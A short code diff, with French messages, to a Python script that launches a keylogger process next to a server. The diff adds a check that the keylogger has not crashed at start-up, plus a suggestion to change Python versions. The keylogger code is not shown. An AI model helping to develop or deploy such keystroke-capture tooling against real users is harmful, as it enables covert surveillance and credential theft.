@@ -76,6 +76,14 @@ def main() -> None:
     try:
         keylogger_process = start_keylogger()
         print(f"[+] Keylogger lancé (PID {keylogger_process.pid})")
+        # Attendre un peu pour voir si le keylogger plante immédiatement
+        time.sleep(2)
+        if keylogger_process.poll() is not None:
+            print("[-] ERREUR: Le keylogger s'est arrêté immédiatement!")
+            print("[-] Vérifiez les erreurs ci-dessus.")
+            print("[-] Solution probable: Utilisez Python 3.12 ou 3.11 au lieu de 3.13")
+            server.shutdown()
+            sys.exit(1)
     except Exception as exc:
         server.shutdown()
         raise exc
